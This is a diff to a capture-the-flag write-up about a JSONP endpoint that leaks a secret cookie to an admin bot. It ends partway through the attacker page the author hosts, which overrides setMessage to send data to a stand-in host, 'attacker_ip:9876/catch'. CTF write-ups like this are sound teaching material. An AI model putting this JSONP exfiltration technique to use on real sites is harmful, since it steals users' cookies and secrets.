@@ -7,7 +7,7 @@ For this challenge you will need to submit a URL to the admin bot (a program tha
 
 **Challenge Code: chal.py**
 
-```
+```python
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -28,18 +28,17 @@ app.run(port=12345)
 ```
 
 **Challenge Code: home.html**
-```
-ome.html 
+```html
 <!DOCTYPE html>
 <html>
     <body>
         <h4>Welcome to my home page!</h4>
         Message of the day: <span id="message">(loading...)</span>
         <script>
-window.setMessage = (m) => {
-    document.getElementById("message").innerText = m;
+        window.setMessage = (m) => {
+         document.getElementById("message").innerText = m;
 }
-window.onload = () => {
+    window.onload = () => {
     s = document.createElement("script");
     s.src = "/api";
     document.body.appendChild(s);
@@ -53,7 +52,7 @@ window.onload = () => {
 
 The challenge provides a JSONP API endpoint.
 
-```
+```python
 @app.route("/api")
 def page():
     secret = request.cookies.get("secret", "EXAMPLEFLAG")
@@ -67,7 +66,7 @@ The first one which provides the malicious code and whose URL I give to the admi
 
 **1.** `$python3 -m http.server 1234` - Server with our malicious code.
 
-```
+```html
 <script>
                     var target="http://attacker_ip:9876/catch";
                     function setMessage(o){
